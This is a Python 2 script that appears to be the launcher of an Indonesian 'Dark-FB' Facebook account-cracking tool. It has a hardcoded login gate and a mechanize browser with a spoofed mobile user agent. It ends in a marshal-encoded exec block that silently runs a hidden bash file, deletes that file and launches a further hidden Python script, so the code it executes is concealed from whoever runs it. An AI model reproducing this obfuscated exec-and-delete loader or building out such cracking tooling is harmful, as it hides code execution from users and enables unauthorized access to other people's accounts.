# -*- coding: utf-8 -*-
import os, sys
print '\x1b[1;33mSudah punya ID dan Password nya?'
print '\x1b[1;32mSilahkan Login '
import os, sys

def wa():
    os.system('xdg-open https://api.whatsapp.com/send?phone=6289504315559&text=Assalamualaikum')


def restart():
    ngulang = sys.executable
    os.execl(ngulang, ngulang, *sys.argv)


user = raw_input('ID: ')
import getpass
sandi = raw_input('Password: ')
if sandi == 'Tn.404' and user == 'Prast.3526':
    print 'Anda Telah Login'
    sys.exit
else:
    print 'Login GAGAL, Silahkan hubungi ADMIN'
    wa()
    restart()
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
    print '\x1b[1;91m[!] Closed'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = " \x1b[1;97m█████████\n \x1b[1;97m█▄█████▄█         \x1b[1;96m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;97m█ \x1b[1;91m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;97m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;97m█ \x1b[1;91m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mVIP.VPRO\n \x1b[1;97m█████████         \x1b[1;96m«==========✧==========»\n \x1b[1;97m ██ ██\n \x1b[1;97m╔══════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode  \x1b[1;91m: \x1b[1;96m Tn.404\x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m \x1b[92mhttps://github.com/Tn404\x1b[ \x1b[1;97m      ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mWA      \x1b[1;91m:  \x1b[1;92\x1b[92m089504315559\x1b[     \x1b[1;97m                    ║   \n \x1b[1;97m╚══════════════════════════════════════════════════╝"  '\n[*] Terimakasih telah menggunakan script ini'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)
import marshal
exec(marshal.loads('''c\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00@\x00\x00\x00s\xa5\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x00\x00d\x01\x00l\x01\x00Z\x01\x00d\x00\x00d\x01\x00l\x02\x00Z\x02\x00e\x00\x00j\x03\x00j\x04\x00d\x02\x00\x83\x01\x00rr\x00d\x03\x00GHe\x02\x00j\x05\x00d\x04\x00\x83\x01\x00\x01e\x00\x00j\x06\x00d\x05\x00\x83\x01\x00\x01e\x00\x00j\x06\x00d\x06\x00\x83\x01\x00\x01e\x00\x00j\x06\x00d\x07\x00\x83\x01\x00\x01n\x00\x00y\x11\x00e\x00\x00j\x06\x00d\x08\x00\x83\x01\x00\x01Wn\x1b\x00\x04e\x07\x00k\n\x00r\xa0\x00\x01\x01\x01e\x01\x00j\x08\x00\x83\x00\x00\x01n\x01\x00Xd\x01\x00S(\t\x00\x00\x00i\xff\xff\xff\xffNs\x0c\x00\x00\x00.Akun/.Bahans\x14\x00\x00\x00[>] Install Bahan \n\ni\x02\x00\x00\x00s\x11\x00\x00\x00bash .Akun/.Bahans\x1a\x00\x00\x00pip2 install --upgrade pips\x0f\x00\x00\x00rm .Akun/.Bahans\x11\x00\x00\x00python2 .Akun/.Rt(\t\x00\x00\x00t\x02\x00\x00\x00ost\x03\x00\x00\x00syst\x04\x00\x00\x00timet\x04\x00\x00\x00patht\x06\x00\x00\x00existst\x05\x00\x00\x00sleept\x06\x00\x00\x00systemt\x0b\x00\x00\x00ImportErrort\x04\x00\x00\x00exit(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\n\x00\x00\x00<DedeHair>t\x08\x00\x00\x00<module>\x07\x00\x00\x00s\x14\x00\x00\x00$\x01\x12\x01\x05\x01\r\x01\r\x01\r\x01\x10\x01\x03\x01\x11\x01\r\x01'''))
